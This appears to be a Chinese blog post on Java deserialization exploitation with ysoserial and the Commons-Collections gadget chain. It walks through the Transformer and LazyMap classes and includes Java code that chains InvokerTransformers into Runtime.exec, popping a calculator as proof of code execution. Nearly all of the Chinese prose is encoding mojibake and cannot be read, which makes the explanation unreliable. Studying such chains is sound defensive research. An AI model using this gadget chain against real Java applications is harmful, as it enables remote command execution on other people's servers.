title="javassiståŠ¨æ€ç¼–ç¨‹"></a>javassiståŠ¨æ€ç¼–ç¨‹</h2><p>ysoserialä¸­åŸºæœ¬ä¸Šæ‰€æœ‰çš„æ¶æ„objectéƒ½æ˜¯é€šè¿‡åŠ¨æ€ç¼–ç¨‹çš„æ–¹å¼ç”Ÿæˆçš„ï¼Œé€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹å·²ç»å­˜åœ¨çš„javaæ–‡ä»¶å­—èŠ‚ç è¿›è¡Œæ“ä½œï¼Œä¹Ÿå¯ä»¥åœ¨å†…å­˜ä¸­åŠ¨æ€ç”ŸæˆJavaä»£ç ï¼ŒåŠ¨æ€ç¼–è¯‘æ‰§è¡Œï¼Œå…³äºè¿™æ ·åšçš„å¥½å¤„ï¼Œä½œè€…åœ¨å·¥å…·ä¸­ä¹Ÿæœ‰æåˆ°ï¼š</p><p>could also do fun things like injecting a pure-java rev&#x2F;bind-shell to bypass naive protections</p><p>å…³äºjavassiståŠ¨æ€ç¼–ç¨‹ï¼Œæˆ‘å°±åªæŠŠå…³é”®çš„å‡½æ•°åŠå…¶åŠŸèƒ½ç½—åˆ—ä¸€ä¸‹äº†</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–é»˜è®¤ç±»æ± ï¼Œåªæœ‰åœ¨è¿™ä¸ªClassPoolé‡Œé¢å·²ç»åŠ è½½çš„ç±»ï¼Œæ‰èƒ½ä½¿ç”¨</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//è·å–poolä¸­çš„æŸä¸ªç±»</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;test.Teacher&quot;</span>);</span><br><span class="line"><span class="comment">//ä¸ºccç±»è®¾ç½®çˆ¶ç±»</span></span><br><span class="line">cc.setSuperclass(pool.get(<span class="string">&quot;test.People&quot;</span>));</span><br><span class="line"><span class="comment">//å°†åŠ¨æ€ç”Ÿæˆç±»çš„classæ–‡ä»¶å­˜å‚¨åˆ°pathè·¯å¾„ä¸‹</span></span><br><span class="line">cc.writeFile(path);</span><br><span class="line"><span class="comment">//è·å–ç±»çš„å­—èŠ‚ç </span></span><br><span class="line"><span class="type">byte</span>[] b=cc.toBytecode();</span><br><span class="line"><span class="comment">//åˆ›é€ Pointç±»</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line"><span class="comment">//ä¸ºccç±»æ·»åŠ æˆå‘˜å˜é‡</span></span><br><span class="line">cc.addField(f);</span><br><span class="line"><span class="comment">//ä¸ºccç±»æ·»åŠ æ–¹æ³•</span></span><br><span class="line">cc.addMethod(m);</span><br><span class="line"><span class="comment">//ä¸ºccç±»è®¾ç½®ç±»å</span></span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div><h2 id="CCé“¾"><a href="#CCé“¾" class="headerlink" title="CCé“¾"></a>CCé“¾</h2><p><a class="link"   href="https://xz.aliyun.com/t/9409#toc-2" >CCé“¾ 1-7 åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>CCé“¾ï¼ˆCommons-Collectionsï¼‰ä¸­éå¸¸é‡è¦çš„å°±æ˜¯å‡ ä¸ªTransformerç±»ã€HashMapã€HashSetã€HashTableã€LazyMapã€TiedMapEntryã€BadAttributeValueExpExceptionã€AnnotationInvocationHandlerã€Proxy.newProxyInstanceï¼Œçœ‹ç€å¥½åƒå¾ˆå¤šæœ‰ç‚¹å”¬äººï¼Œå…¶å®ç†è§£ä¹‹åä¼šå‘ç°éƒ½ä¸æ˜¯å¤§é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯çœ‹è¿‡è¿™äº›ç±»çš„æºç ä¹‹åï¼Œæ¯ä¸ªåˆ©ç”¨é“¾å°±ä¼šå¾ˆæ¸…æ™°ã€‚</p><p>CCé“¾çš„åˆ©ç”¨æ¡ä»¶å­˜åœ¨ä¸€äº›é™åˆ¶ï¼Œä¸»è¦è¡¨ç°ä¸º:</p><ul><li>jdk8u71ä¹‹å‰å¯ä»¥ä½¿ç”¨AnnotationInvocationHandlerä½œä¸ºå‰æ®µï¼Œä¹‹åä¸è¡Œ</li><li>jdk7ä½ç‰ˆæœ¬ä¸­æ— æ³•ä½¿ç”¨CC5(BadAttributeValueExpExceptionä¸å­˜åœ¨readObject)</li><li>commons-collections3.xå¯ä»¥ä½¿ç”¨LazyMap.decorateä½œä¸ºå‰æ®µï¼Œä¹‹åä¸è¡Œ</li><li>commons-collections4.0ä¹‹åå¯ä»¥ç›´æ¥å›è°ƒPriorityQueueä½œä¸ºå‰æ®µï¼Œä¹‹å‰ä¸è¡Œ</li></ul><p>å…ˆä»‹ç»å‡ ä¸ªé‡Œé¢è°ƒç”¨åˆ°çš„ç±»</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>è¯¥ç±»å®ç°äº†Transformeræ¥å£ï¼Œå¹¶é‡å†™äº†tranformæ–¹æ³•ï¼Œç”¨äºè·å–ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨transformæ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è·å–å¯¹è±¡</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>è¯¥ç±»å®ç°äº†Transformeræ¥å£ï¼Œå¹¶é‡å†™äº†tranformæ–¹æ³•ï¼Œå…¶ transform æ–¹æ³•ä½œç”¨æ˜¯åå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œåå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> â€¦â€¦â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¼¹è®¡ç®—å™¨</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;);</span><br><span class="line">     transformer.transform(Runtime.getRuntime());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯åå°„è°ƒç”¨æ„é€ å‡½æ•°å°†ç±»å®ä¾‹åŒ–ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3786388740793356347L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NO_ARG_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œåå°„è°ƒç”¨æ„é€ å‡½æ•°å°†ç±»å®ä¾‹åŒ–ã€‚</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æµ‹è¯•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Student ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;å­¦ç”Ÿå§“å:&quot;</span> + name);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;å°æ˜&quot;</span>&#125;);</span><br><span class="line">     instantiateTransformer.transform(Student.class);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡º</span></span><br><span class="line"><span class="comment">//å­¦ç”Ÿå§“å:å°æ˜</span></span><br></pre></td></tr></table></figure></div></blockquote><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯å®ç°æ•°ç»„é“¾å¼è°ƒç”¨ã€‚æˆ‘ä»¬åªéœ€ä¼ å…¥ä¸€ä¸ª Transformer[] ç»™ ChainedTransformerï¼Œç„¶åæ‰§è¡Œ ChainedTransformer çš„ transform æ–¹æ³•ä¾¿å¯ä»¥é“¾å¼è°ƒç”¨ Transformer[] ä¸­æ¯ä¸ª Transformer çš„ transform æ–¹æ³•ã€‚</p><p>å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨ä¸€èµ·ã€‚é€šä¿—æ¥è¯´å°±æ˜¯ï¼Œå‰ä¸€ä¸ªå›è°ƒtransformæ–¹æ³•è¿”å›çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªå›è°ƒtransformæ–¹æ³•çš„å‚æ•°ä¼ å…¥</p><p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œé“¾å¼è°ƒç”¨  Transformer[] ä¸­æ¯ä¸ª Transformer çš„ transform æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æµ‹è¯• åˆ©ç”¨ ChainedTransformer å®ç° Runtime.<em>getRuntime</em>().exec(â€œcalcâ€) ï¼‰</p><p>å› ä¸ºRuntimeç±»æ²¡æœ‰å®ç°Serializableï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡classä¸€æ­¥æ­¥æ„é€ </p><p>getRuntime()æ–¹æ³•å¯ä»¥è·å–ä¸ä¹‹ç›¸å…³çš„Runtimeå¯¹è±¡</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æµ‹è¯• ChainedTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">     Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),<span class="comment">//ç”¨getMethodå¾—åˆ°getRuntimeï¼Œå› ä¸ºgetRuntimeæ²¡æœ‰å‚æ•°ï¼Œæ‰€ä»¥ä¼ äº†ä¸ªnew Class[0]</span></span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),<span class="comment">//getRuntimeæ˜¯é™æ€æ–¹æ³•ï¼Œå¾—åˆ°Runtimeç±»</span></span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)<span class="comment">//åå°„è°ƒç”¨Runtimeç±»çš„execæ–¹æ³•</span></span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">     chainedTransformer.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><blockquote><p>å¦‚æœç»™è¿™ä¸ªå‡½æ•°ä¼ å…¥nullçš„è¯ï¼Œä¼šç›´æ¥æŠ›å‡º NullPointerException ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œä½†ä¼ å…¥new Class [0]çš„è¯åˆ™ä¸ä¼šæŠ›å¼‚å¸¸</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                  Object... args)</span></span><br><span class="line">           <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">                  IllegalArgumentException,</span><br><span class="line">                  InvocationTargetException</span><br></pre></td></tr></table></figure></div><p>å¯¹å¸¦æœ‰æŒ‡å®šå‚æ•°çš„æŒ‡å®šå¯¹è±¡è°ƒç”¨ç”±æ­¤ Method å¯¹è±¡è¡¨ç¤ºçš„åº•å±‚æ–¹æ³•ã€‚ä¸ªåˆ«å‚æ•°è¢«è‡ªåŠ¨è§£åŒ…ï¼Œä»¥ä¾¿ä¸åŸºæœ¬å½¢å‚ç›¸åŒ¹é…ï¼ŒåŸºæœ¬å‚æ•°å’Œå¼•ç”¨å‚æ•°éƒ½éšéœ€æœä»æ–¹æ³•è°ƒç”¨è½¬æ¢ã€‚</p><p>å¦‚æœåº•å±‚æ–¹æ³•æ˜¯é™æ€çš„ï¼Œé‚£ä¹ˆå¯ä»¥å¿½ç•¥æŒ‡å®šçš„ <code>obj</code> å‚æ•°ã€‚è¯¥å‚æ•°å¯ä»¥ä¸º nullã€‚ </p><p>å¦‚æœåº•å±‚æ–¹æ³•æ‰€éœ€çš„å½¢å‚æ•°ä¸º 0ï¼Œåˆ™æ‰€æä¾›çš„ <code>args</code> æ•°ç»„é•¿åº¦å¯ä»¥ä¸º 0 æˆ– nullã€‚ </p></blockquote><h3 id="LazyMapâ€“è§¦å‘ChainedTransformer-çš„-transform-æ–¹æ³•"><a href="#LazyMapâ€“è§¦å‘ChainedTransformer-çš„-transform-æ–¹æ³•" class="headerlink" title="LazyMapâ€“è§¦å‘ChainedTransformer çš„ transform æ–¹æ³•"></a>LazyMapâ€“è§¦å‘ChainedTransformer çš„ transform æ–¹æ³•</h3><p>ä¸»è¦åˆ©ç”¨å…¶ä¸­çš„getæ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¯æ§åˆ¶ factory ä¸º ChainedTransformer</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ©ç”¨ get æ–¹æ³•å¯å®ç°è°ƒç”¨ ChainedTransformer#transform()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æµ‹è¯•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 